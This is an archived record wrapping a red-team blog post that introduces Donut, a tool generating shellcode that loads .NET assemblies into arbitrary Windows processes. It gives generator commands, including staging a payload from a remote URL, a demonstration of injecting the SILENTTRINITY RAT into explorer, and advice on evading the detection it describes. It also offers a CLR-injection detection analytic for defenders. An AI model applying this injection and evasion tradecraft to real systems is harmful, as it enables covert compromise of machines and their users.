{
    "id": "4a30636d-0551-49bb-8b10-6fa3bcaac9a9",
    "created_at": "2023-01-12T15:08:04.575213Z",
    "updated_at": "2025-03-27T02:09:29.54117Z",
    "deleted_at": null,
    "sha1_hash": "6b42cad046cc3dda0ed67bb6e6bef17f90cb7e3f",
    "title": "2019-05-09 - Donut - Injecting .NET Assemblies as Shellcode",
    "authors": "",
    "file_creation_date": "2022-05-29T01:32:45Z",
    "file_modification_date": "2022-05-29T01:32:45Z",
    "file_size": 1648967,
    "plain_text": "# Donut - Injecting .NET Assemblies as Shellcode\n\n**thewover.github.io/Introducing-Donut/**\n\n## The Wover\n\nRed Teaming, .NET, and random computing topics\n\n[Blog](https://thewover.github.io/) [About](https://thewover.github.io/about)\n_TLDR: You can now inject .NET Assemblies into Windows processes using this repo:_\n_https://github.com/TheWover/donut/_\n\n## Advancing Tradecraft - Context\n\nOffensive and red team tradecraft have changed significantly in the past year. As antimalware systems improve their capability to detect and deter offensive tools, attackers are\nshifting their focus to technologies that are not observed by AV. Currently, that means\noperating entirely in memory and avoiding dropping files onto disk. In the Windows world, the\n.NET Framework provides a convenient mechanism for this. It is, however, severely\nrestricted in that .NET programs cannot be injected directly into remote processes. In this\narticle, we will address this issue by describing how to inject .NET code into processes via\nshellcode.\n\n## .NET Primer\n\nBefore we begin, you must understand a few important components of .NET.\n\n[Common Language Runtime: Like Java, .NET uses a runtime environment (or “virtual](https://docs.microsoft.com/en-us/dotnet/standard/clr)\nmachine”) to interpret code at runtime. All .NET Code is compiled from an intermediate\nlanguage to native code “Just-In-Time” before execution.\n[Common Intermediate Language: Speaking of an intermediate language, .NET uses](https://docs.microsoft.com/en-us/dotnet/standard/managed-code)\nCIL (also known as MSIL). All .NET languages (of which there are many) are\n“assembled” to this intermediate language. CIL is a generic object-oriented assembly\nlanguage that can be interpreted into machine code for any hardware architecture. As\nsuch, the designers of .NET languages do not need to design their compilers around\nthe architectures they will run on. Instead, they merely need to design it to compile to\none language: CIL.\n\n\n-----\n\n[.NET Assemblies: .NET applications are packaged into .NET Assemblies. They are so](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/assemblies-in-the-common-language-runtime)\ncalled because the code from your language of choice has been “assembled” into CIL\nbut not truly compiled. Assemblies use an extension of the PE format and are\nrepresented as either an EXE or a DLL that contains CIL rather than native machine\ncode.\n[Application Domains: Assemblies are run inside of a safe “box” known as an](https://docs.microsoft.com/en-us/dotnet/framework/app-domains/application-domains)\nApplication Domain. Multiple Assemblies can exist within an AppDomain, and multiple\nAppDomains can exist within a process. AppDomains are intended to provide the same\nlevel of isolation between executing Assemblies as is normally provided for processes.\nThreads may move between AppDomains and can share objects through marshalling\nand delegates.\n\n## Current state of .NET Tradecraft\n\nCurrently, .NET tradecraft is limited to post-exploitation execution by one of two main ways:\n\nAssembly.Load(): The .NET Framework’s standard library includes an API for code\nreflection. This Reflection API includes System.Reflection.Assembly.Load, which can\nbe used to load .NET programs from memory. In less than five lines of code, you may\nload a .NET DLL or EXE from memory and execute it.\nexecute-assembly: In Cobalt Strike 3.11, Raphael Mudge introduced a command called\n‘execute-assembly’ that ran .NET Assemblies from memory as if they were run from\ndisk. This command introduced the world to .NET tradecraft and signalled the shift to\n[Bringing Your Own Land.](https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html)\n\nHowever, both execution vectors produce challenges for red teams seeking to develop\nflexible TTPs.\n\n## Assembly.Load\n\nWhile the Reflection API is very versatile and can be useful in many different ways, it can\nonly run code in the current process. No support is provided for running payloads in remote\nprocesses.\n\n## execute-assembly\n\nThe main problem with execute-assembly is that it executes the same way every time. That\npredictability ensures that it is reliable, but also lets defenders built analytics.\n\n1. A subprocess is created using the spawnto executable. Mudge refers to this as a\n\n“sacrificial process” because it acts as a host for your payloads, isolating your Beacon’s\nprocess from any failure in your code.\n2. A reflective DLL is injected into the subprocess to load the .NET Runtime.\n\n\n-----\n\n3. The reflective DLL loads an intermediate .NET Assembly to handle errors and improve\n\nthe stability of your payload.\n4. The intermediate .NET Assembly loads your .NET Assembly from memory inside the\n\nsubprocess.\n5. The main entry point of your Assembly is invoked along with your command-line\n\narguments.\n\nThe result is that execute-assembly does allow you to inject your .NET Assembly into a\nremote process. However, it does not let you inject into a running process or specify how that\ninjection occurs. It is only modular in what you can run, not how you can run it. The most that\nyou can do is to specify what executable is run for your sacrificial subprocess by changing\nthe spawnto variable in your Malleable C2 Profile. execute-assembly also has a hidden size\nlimitation of 1 MB for your payloads, which limits your flexibility in designing post-exploitation\ntools.\n\n## Moving Forward\n\nTo move past these limitations, we need a technique that meets the following requirements:\n\nAllows you to run .NET code from memory.\nCan work with any Windows process, regardless of its architecture and whether it has\nthe CLR loaded.\nAllows you to inject that code in either a remote (different) process or the local (current)\nprocess.\nAllows you to determine in what way that injection occurs.\nWorks with multiple types of process injection.\n\nThe most flexible type of payload that meets those requirements is shellcode. But you can’t\njust convert a .NET Assembly to shellcode. They run through a runtime environment, not\ndirectly on the hardware. Wouldn’t it be great if we could just inject .NET Assemblies as\nshellcode? Yes. Yes, it would.\n\n## Introducing Donut\n\n\n-----\n\n```\nShortly before publishing donut, Odzhan and I became aware of another team\nworking on a shellcode generator for .NET Assemblies. They were at the same\nstage of their project at us. We both agreed that whomever of us published\nfirst would ensure that the other received due credit for their work. As\nsoon as they publish their tool, we will update this article with a link.\n\n```\n`This project is CLRVoyance, published by Accenture:` [Link to the repo.](https://github.com/Accenture/CLRvoyance)\n\nDonut is a shellcode generation tool that creates x86 or x64 shellcode payloads from .NET\nAssemblies. This shellcode may be used to inject the Assembly into arbitrary Windows\nprocesses. Given an arbitrary .NET Assembly, parameters, and an entry point (such as\nProgram.Main), it produces position-independent shellcode that loads it from memory. The\n.NET Assembly can either be staged from a URL or stageless by being embedded directly in\nthe shellcode. Either way, the .NET Assembly is encrypted with the Chaskey block cipher\nand a 128-bit randomly generated key. After the Assembly is loaded through the CLR, the\n\n\n-----\n\noriginal reference is erased from memory to deter memory scanners. The Assembly is\nloaded into a new Application Domain to allow for running Assemblies in disposable\nAppDomains.\n\nDonut is currently at version 0.9 (Beta). Please share any issues or suggestions with us as\nIssues on GitHub. Once we have received feedback, we will release version 1.0. A link to the\n[compiled v0.9 release can be found here.](https://github.com/TheWover/donut/releases/tag/v0.9)\n\n[This is a joint project between Odzhan and TheWover. Odzhan also created a blog post for](https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/)\nv0.9 release.\n\n## How it Works\n\n Unmanaged Hosting API\n\n[Microsoft provides an API known as the Unmanaged CLR Hosting API. This API allows for](https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/)\nunmanaged code (such as C or C++) to host, inspect, configure, and use Common\nLanguage Runtimes. It is a legitimate API that can be used for many purposes. Microsoft\nuses it for several of their products, and other companies use it to design custom loaders for\ntheir programs. It can be used to improve performance of .NET applications, create\nsandboxes, or just do wierd stuff. We do the latter.\n\nOne of the things it can do is manually load .NET Assemblies into arbitrary Application\nDomains. It can do this either from disk or from memory. We utilize its capability for loading\nfrom memory to load your payload without touching disk.\n\nTo see a standalone example of an Unmanaged CLR Hosting Assembly loader, check out\nCasey Smith’s repo: [AssemblyLoader](https://github.com/caseysmithrc/AssemblyLoader)\n\n## CLR Injection\n\nThe first action that donut’s shellcode takes is to load the CLR. Unless the user specifies the\nexact runtime version to use, v4.0.30319 of the CLR will be used by default, which supports\nthe versions 4.0+ of .NET. If the attempt to load a specific version fails, then donut will\nattempt to use whichever one is available on the system. Once the CLR is loaded, the\nshellcode creates a new Application Domain. At this point, the .NET Assembly payload must\nbe obtained. If the user provided a staging URL, then the Assembly is downloaded from it.\nOtherwise, it is obtained from memory. Either way, it will loaded into the new AppDomain.\nAfter the Assembly is loaded but before it is run, the decrypted copy will be released and\nlater freed from memory with VirtualFree to deter memory scanners. Finally, the Entry Point\nspecified by the user will be invoked along with any provided parameters.\n\n\n-----\n\nIf the CLR is already loaded into the host process, then donut s shellcode will still work. The\n.NET Assembly will just be loaded into a new Application Domain within the managed\nprocess. .NET is designed to allow for .NET Assemblies built for multiple versions of .NET to\nrun simultaneously in the same process. As such, your payload should always run no matter\nthe process’s state before injection.\n\n## Shellcode Generation\n\nThe logic above describes how the shellcode generated by donut works. That logic is defined\nin payload.exe. To get the shellcode, exe2h extracts the compiled machine code from the\n.text segment in payload.exe and saves it as a C array to a C header file. donut combines\nthe shellcode with a Donut Instance (a configuration for the shellcode) and a Donut Module\n(a structure containing the .NET assembly, class name, method name and any parameters).\n\n## Using Donut\n\nDonut can be used as-is to generate shellcode from arbitrary .NET Assemblies. Both a\nWindows EXE and a Python (Python planned for v1.0) script are provided for payload\ngeneration. The command-line syntax is as described below.\n```\n usage: donut [options] -f <.NET assembly> -c <namespace.class> -m <Method>\n    -f <path>      .NET assembly to embed in PIC and DLL.\n    -u <URL>       HTTP server hosting the .NET assembly.\n    -c <namespace.class> The assembly class name.\n    -m <method>     The assembly method name.\n    -p <arg1,arg2...>  Optional parameters for method, separated by comma or\nsemi-colon.\n    -a <arch>      Target architecture : 1=x86, 2=amd64(default).\n    -r <version>     CLR runtime version. v4.0.30319 is used by default.\n    -d <name>      AppDomain name to create for assembly. Randomly generated\nby default.\n examples:\n  donut -a 1 -c TestClass -m RunProcess -p notepad.exe -f loader.dll\n  donut -f loader.dll -c TestClass -m RunProcess -p notepad.exe -u\nhttp://remote_server.com/modules/\n\n## Generating Shellcode\n\n```\nTo generate shellcode with donut, you must specify a .NET Assembly, an Entry Point, and\nany parameters that you wish to use. If your Assembly uses the Test namespace and\nincludes the Program class with the Main method, then you would use the following options:\n```\ndonut.exe -f Test.exe -c Test.Program -m Main\n\n```\nTo generate the same shellcode for 32-bit processes, use the ‘-a’ option:\n\n\n-----\n\n```\ndonut.exe a 1 f Test.exe c Test.Program m Main\n\n```\nYou may also provide parameters to whatever Entry Point you specify. The max length of\neach parameter is currently 32 characters. To demonstrate this functionality, you may use the\nfollowing options and our example Assembly to create shellcode that will spawn a Notepad\nprocess and a Calc process:\n```\n.\\donut.exe -f .\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m\nRunProcess -p notepad.exe,calc.exe\n\n```\nWhen generating shellcode to run an an older Windows machine, you may need it to use v2\nof the CLR, rather than v4. v2 works for versions of the .NET Framework <= 3.5, while v4\nworks for versions >= 4.0. By default, donut uses version 4 of the CLR. You may tell it to use\nv2 with the ‘-r’ option and specifying “v2.0.50727” as the parameter.\n```\n.\\donut.exe -r v2.0.50727 -f .\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c\nTestClass -m RunProcess -p notepad.exe,calc.exe\n\n```\nThe name of the AppDomain for your .NET payload may be specified manually using the ‘-d’\noption. By default, it will be randomly generated. You may specify a name.\n```\n.\\donut.exe -d ResourceDomain -r v2.0.50727 -f\n.\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m RunProcess -p\nnotepad.exe,calc.exe\n\n```\nIn order to reduce the size of your shellcode (or for many other reasons), you may specify a\nURL where your payload will be hosted. Donut will produce an encrypted Donut Module with\na random name that you should place at the URI you specified. The name and location\nwhere you should place it will be printed to your screen when you generate the shellcode.\n```\n.\\donut.exe -u http://remote_server.com/modules/ -d ResourceDomain -r v2.0.50727 -f\n.\\DemoCreateProcess\\bin\\Release\\DemoCreateProcess.dll -c TestClass -m RunProcess -p\nnotepad.exe,calc.exe\n\n## Demonstrating with SILENTTRINITY\n\n```\n[For a demonstration, we will use the SILENTTRINITY RAT as a test payload. Since it is the](https://github.com/byt3bl33d3r/SILENTTRINITY)\nmost… ahh… complicated .NET Assembly that I could find, I used it for all of my testing. You\nmay use any standard shellcode injection technique to inject the .NET Assembly. The\nDonutTest subproject is provided in the repo as an example injector. You may combine it with\nthe DonutTest subproject to test the shellcode generator. In our case, we will first use\nDonutTest to inject into explorer. We also show what it looks like to use an existing implant to\nperform further injection using the `boo/shellcode and` `ipy/execute-assembly post-`\nexploitation modules.\n\n### Generation\n\n\n-----\n\nFirst, we will generate a x64 PIC using the SILENTTRINITY DLL. Using PowerShell, we will\nbase64-encode the result and pipe it to our clipboard.\n\nBecause we don’t know what processes will be available to inject into on-target, we will also\ngenerate a x86 PIC just in case we need it.\n\nIf you wanted to, you could use a staging server by providing the URL and copying the Donut\nModule to the specified location.\n\n### Choosing a Host Process\n\n\n-----\n\nUse ProcessManager, a sub-project provided in the donut repo, to enumerate processes.\nProcessManager enumerates all running processes and makes a best effort to obtain\ninformation about them. It is specifically designed to aid in determining what process to inject\n/ migrate into. The picture below demonstrates its general usage.\n\n### Injecting\n\nFirst, we will use DonutTest to inject into explorer using DonutTest. We pasted the encoded\nshellcode from above into DonutTest and rebuilt it for our test.\n\nAs you can see, the injection was successfull:\n\n\n-----\n\nNow assume we already have an agent running on the machine. We can use\nSILENTTRINITY’s post-exploitation modules to inject implants into running processes.\n\n## Using as a Library\n\ndonut is provided as both dynamic and static libraries for both (.a / .so) and Windows (.lib /\n_.dll). It has a simple API that is described in docs\\api.html. Two exported functions are_\nprovided, `int DonutCreate(PDONUT_CONFIG c) and` `int DonutDelete(PDONUT_CONFIG`\n```\nc) .\n\n```\n\n-----\n\n## Rebuilding the shellcode\n\nYou may easily customize our shellcode to fit your use case. payload.c contains the .NET\nassembly loader, which should successfully compile with both Microsoft Visual Studio and\nmingw-w64. Make files have been provided for both compilers which will generate x86-64\nshellcode by default unless x86 is supplied as a label to nmake/make. Whenever payload.c\nhas been changed, recompiling for all architectures is recommended before rebuilding donut.\n\n### Microsoft Visual Studio\n\nOpen the x64 Microsoft Visual Studio build environment, switch to the payload directory, and\ntype the following:\n```\nnmake clean -f Makefile.msvc\nnmake -f Makefile.msvc\n\n```\nThis should generate a 64-bit executable (payload.exe) from payload.c. exe2h will then\nextract the shellcode from the .text segment of the PE file and save it as a C array to\n_payload_exe_x64.h. When donut is rebuilt, this new shellcode will be used for all payloads_\nthat it generates.\n\nTo generate 32-bit shellcode, open the x86 Microsoft Visual Studio build environment, switch\nto the payload directory, and type the following:\n```\nnmake clean -f Makefile.msvc\nnmake x86 -f Makefile.msvc\n\n```\nThis will save the shellcode as a C array to payload_exe_x86.h.\n\n### Mingw-w64\n\nAssuming you’re on Linux and mingw-w64 has been installed from packages or source, you\nmay still rebuild the shellcode using our provided makefile. Change to the payload directory\nand type the following:\n```\nmake clean -f Makefile.mingw\nmake -f Makefile.mingw\n\n```\nOnce you’ve recompiled for all architectures, you may rebuild donut.\n\n## Integrating into Tooling\n\nWe hope that donut (or something inspired by it) will be integrated into tooling to provide\n**inject and migrate functionality. To do so, we suggest one of the following methods:**\n\nAs an operator, using the generator to manually generate shellcode.\n\n\n-----\n\nGenerate the shellcode dynamically on your C2 server, pass that down to an existing\nimplant, and inject it into another process.\nUse our dynamic or static libraries.\nAs a template for building your own shellcode / generator.\nUse our Python (Python planned for v1.0) extension to script shellcode generation\ndynamically.\n\n## Advancing Tradecraft\n\nIt is our hope that releasing donut to the public will advance offensive and red team\ntradecraft in several ways:\n\nProvide red teams and adversary emulators with a means to emulate this technique\nthat threat actors may have developed in secret.\nProvide blue teams a frame of refernce for detecting and mitigating CLR Injection\ntechniques.\nInspire tool developers to develop new types of techniques and tradecraft.\n\n## Alternative Payloads\n\nThe main benefit of using .NET Assemblies as shellcode is that they can now be executed\nby anything that can execute shellcode on Windows. There are many more ways to inject\nshellcode than there are to load Assemblies. As such, offensive tool designers no longer\nneed to design their payloads around running .NET. Instead, they may leverage their existing\npayloads and techniques that use shellcode.\n\n## Injecting .NET At Will / Migration\n\nDonut will also allow the developers of C2 Frameworks / RATs to add migrate-like\nfunctionality to their tools. By using Donut as a library (or calling the generator) on the server\nand then providing the result to an existing agent, it may inject a new instance of itself into\nanother running process. This may also be used to inject arbitrary post-exploitation modules\nso long as I/O is properly redirected.\n\n## Disposable AppDomains\n\nWhen donut loads an Assembly, it loads it into a new AppDomain. Unless the user specifies\nthe name of the AppDomain with the ‘-d’ parameter, the AppDomain is given a random\nname. We specifically designed donut to run payloads in new AppDomains rather than using\nDefaultDomain. If this does not suit you, you can easily modify payload.c to use the default\ndomain. By running the payload in its own AppDomain, this allows for the development of\ntools that run post-exploitation modules in disposable AppDomains. Application Domains can\nbe unloaded, but individual Assemblies cannot. Therefore, to unload an Assembly when you\nare done with it you must put it into its own AppDomain and unload that instead A C# agent\n\n\n-----\n\ncan have the shellcode generated on its server, inject the result into itself in a new thread,\nwait for the Assembly to finish executing, then unload the host AppDomain. You could also\nmodify the shellcode itself to perform that role.\n\n## Detecting CLR Injection\n\nOne of the companion projects for donut is ModuleMonitor. It uses WMI Event\nWin32_ModuleLoadTrace to monitor for module loading. It provides filters, detailed data, and\nhas an option to monitor for CLR Injection attacks.\n\nThe CLR Sentry option follows some simple logic: If a process loads the CLR, but the\nprogram is not a .NET program, then the CLR has been injected into it.\n\nWhile useful, there are both false positives and false negatives:\n\nFalse Postiive: There are (few) legitimate uses of the Unmanaged CLR Hosting API. If\nthere weren’t, then Microsoft wouldn’t have made it. CLR Sentry will notice every\nunmanaged program that loads the CLR.\nFalse Negatives: This will NOT notice injection of .NET code into processes that\nalready have the CLR loaded. So, no use of the Reflection API and not when donut is\nused to inject shellcode into managed processes.\n\nPlease Note: This is intended only as a Proof-of-Concept to demonstrate the anomalous\nbehavior produced by CLR injection and how it may be detected. It should not be used in any\nway in a production environment. You could perform the same logic with the Image Load\nevent for Sysmon or ETW. They would be easier to scale and integrate with enterprise\ntooling.\n\nI am not a defender, but the following pseudocode is my attempt at an analytic that follows\nthis logic. The DLLs that are associated with the CLR all start with “msco”, such as\n“mscorlib.dll” and “mscoree.dll”. As such, we watch for their loading, then check if the\nprogram that loaded them is a valid .NET Assembly.\n```\nvoid CLR_Injection:\n  WHEN Image_Load event:\n    if event.Module.Name contains \"msco*.dll\":\n    {\n      if !(IsValidAssembly(event.Process.FilePath)):\n      {\n        print \"A CLR has been injected into \" + event.Process.Id\n      }\n    }\n\n```\nThe snippet below represents my implementation of this logic in C#. The full code can be\nfound in ModuleMonitor.\n\n\n-----\n\n```\n//CLR Sentry\n//Author: TheWover\n while (true)\n    {\n      //Get the module load.\n      Win32_ModuleLoadTrace trace = GetNextModuleLoad();\n      //Split the file path into parts delimited by a '\\'\n      string[] parts = trace.FileName.Split('\\\\');\n      //Check whether it is a .NET Runtime DLL\n      if (parts[parts.Length - 1].Contains(\"msco\"))\n      {\n        //Get a \n        Process proc = Process.GetProcessById((int) trace.ProcessID);\n        //Check if the file is a .NET Assembly\n        if (!IsValidAssembly(proc.StartInfo.FileName))\n        {\n          //If it is not, then the CLR has been injected.\n          Console.WriteLine();\n          Console.WriteLine(\"[!] CLR Injection has been detected!\");\n          //Display information from the event\n          Console.WriteLine(\"[>] Process {0} has loaded the CLR but is not\na .NET Assembly:\", trace.ProcessID);\n        }\n      }\n    }\n\n```\n\n-----\n\nIt is important to note that this behaviour represents all CLR Injection techniques, of which\nthere are several. This detection should work for donut, as well as other tools such as Cobalt\nStrike’s ‘execute-assembly’ command.\n\n## OpSec Considerations\n\nModuleMonitor demonstrates an important point about CLR Injection: When performed\nagainst unmanaged processes, CLR Injection produces highly anomalous process behavior.\nThe loading of a CLR after a process’s initial execution or from unmanaged code is unusual.\nThere are few legitimate use cases. From a defender’s perspective, this allows you to build a\nanalytics that monitor for the behavior described in the section above.\n\nHowever, as I mentioned, this analytic fails to detect CLR Injection into processes that\nalready have the CLR loaded. As such, an operator could evade the analytic by simply\ninjecting into processes that are already managed. I would recommend the following\nstandard operating procedure:\n\n1. Run ProcessManager from memory to enumerate processes. Take note of which you\n\ncan inject into.\n2. If there are any processes that are already managed, then consider them the set of\n\npotential targets.\n3. If there are not any managed processes, then all processes are potential targets.\n4. Either way, inject / migrate into the process that is most likely to naturally produce\n\nnetwork traffic and live the longest.\n\nOr to put it simply:\n\nWhenever possible, prefer to inject .NET Assemblies into processes that already have\nthe CLR loaded.\n\n## Conclusion\n\nOffensive .NET tradecraft is faced with several important challenges. One of them is the lack\nof means to inject into remote processes at will. While this can normally be performed with\nshellcode, there is no way to produce shellcode that can run a .NET Assembly directly on\nhardware. Any shellcode that runs a .NET Assembly must first bootstrap the Common\nLanguage Runtime and load the Assembly through it. Enter Donut. With Donut, we now have\na framework for generating flexible shellcode that loads a .NET Assembly from memory. This\ncan be combined with existing techniques and tooling to advance tradecraft in a number of\nways. Hopefully, this will break down the current barriers in .NET-based exploitation and\nprovide tool designers with a foundation for crafting more excellent tools.\n\nWritten on May 9, 2019\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-05-09 - Donut - Injecting .NET Assemblies as Shellcode.pdf"
    ],
    "report_names": [
        "2019-05-09 - Donut - Injecting .NET Assemblies as Shellcode.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536084,
    "ts_updated_at": 1743041369,
    "ts_creation_date": 1653787965,
    "ts_modification_date": 1653787965,
    "files": {
        "pdf": "https://archive.orkl.eu/6b42cad046cc3dda0ed67bb6e6bef17f90cb7e3f.pdf",
        "text": "https://archive.orkl.eu/6b42cad046cc3dda0ed67bb6e6bef17f90cb7e3f.txt",
        "img": "https://archive.orkl.eu/6b42cad046cc3dda0ed67bb6e6bef17f90cb7e3f.jpg"
    }
}